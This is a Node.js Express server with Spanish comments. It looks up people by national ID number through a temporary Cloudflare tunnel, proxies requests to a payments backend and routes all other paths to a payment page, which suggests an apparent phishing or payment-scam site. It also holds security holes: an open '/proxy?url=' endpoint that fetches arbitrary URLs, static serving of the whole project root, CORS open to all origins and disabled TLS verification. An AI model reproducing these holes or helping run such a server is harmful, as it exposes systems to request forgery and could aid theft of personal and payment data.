const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");
const { createProxyMiddleware } = require("http-proxy-middleware");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// CONFIGURACIÓN
// ============================================================

// URL base de la API destino para consulta de clientes (NUIP)
const API_BASE =
  process.env.API_BASE_URL ||
  "https://analyze-produces-realm-autos.trycloudflare.com";

// URL del backend de pagos (proxy /api/...)
const BACKEND_URL =
  process.env.BACKEND_URL ||
  "https://backvenecol.onrender.com";

// ============================================================
// MIDDLEWARES GLOBALES
// ============================================================

// CORS abierto
app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);

app.use(express.json());

// Sirve archivos estáticos desde la raíz del proyecto
// (index.html, consultar.html, revision.html, pago.html, imágenes, etc.)
app.use(express.static(__dirname));

// ============================================================
// HEALTH CHECK
// ============================================================
app.get("/health", (_req, res) => {
  res.json({
    status: "ok",
    message: "Servidor unificado activo",
    apiBase: API_BASE,
    backendUrl: BACKEND_URL,
  });
});

// ============================================================
// RUTA PRINCIPAL: buscar cliente (consulta NUIP)
// GET /api/buscar_cliente?cedula=11011545
// ============================================================
app.get("/api/buscar_cliente", async (req, res) => {
  const { cedula } = req.query;

  if (!cedula) {
    return res.status(400).json({ error: "El parámetro 'cedula' es requerido" });
  }

  try {
    const url = `${API_BASE}/consultadb/api_buscar_cliente_inteligente.php?cedula=${encodeURIComponent(cedula)}`;
    const response = await fetch(url, {
      method: "GET",
      headers: { Accept: "application/json" },
    });

    const contentType = response.headers.get("content-type") || "";
    let data;

    if (contentType.includes("application/json")) {
      data = await response.json();
    } else {
      const text = await response.text();
      try {
        data = JSON.parse(text);
      } catch {
        data = { raw: text };
      }
    }

    res.status(response.status).json(data);
  } catch (err) {
    console.error("Error al consultar API destino:", err.message);
    res.status(502).json({
      error: "No se pudo conectar con la API destino",
      detail: err.message,
    });
  }
});

// ============================================================
// PROXY GENÉRICO (opcional)
// GET /proxy?url=https://...
// ============================================================
app.get("/proxy", async (req, res) => {
  const targetUrl = req.query.url;

  if (!targetUrl) {
    return res.status(400).json({ error: "El parámetro 'url' es requerido" });
  }

  try {
    const response = await fetch(targetUrl, {
      headers: { Accept: "application/json" },
    });

    const contentType = response.headers.get("content-type") || "";
    let data;

    if (contentType.includes("application/json")) {
      data = await response.json();
    } else {
      const text = await response.text();
      try {
        data = JSON.parse(text);
      } catch {
        data = { raw: text };
      }
    }

    res.status(response.status).json(data);
  } catch (err) {
    console.error("Error proxy genérico:", err.message);
    res.status(502).json({ error: "Fallo en proxy", detail: err.message });
  }
});

// ============================================================
// PROXY HACIA EL BACKEND DE PAGOS
// Todo lo que vaya a /api/... (excepto /api/buscar_cliente, que ya
// se manejó arriba) se redirige a BACKEND_URL
// ============================================================
app.use(
  "/api",
  createProxyMiddleware({
    target: BACKEND_URL,
    changeOrigin: true,
    secure: false,
    // Evita que http-proxy-middleware capture /api/buscar_cliente
    // (ya respondido antes por express)
    pathRewrite: (pathReq, req) => {
      // Si por alguna razón llega aquí, se mantiene la ruta
      return pathReq;
    },
  })
);

// ============================================================
// FALLBACK: cualquier otra ruta sirve pago.html
// (útil si tienes una SPA o un flujo que siempre debe mostrar pago)
// ============================================================
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "pago.html"));
});

// ============================================================
// ARRANQUE
// ============================================================
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Servidor unificado corriendo en puerto ${PORT}`);
  console.log(`   API consulta clientes: ${API_BASE}`);
  console.log(`   Backend pagos:         ${BACKEND_URL}`);
});
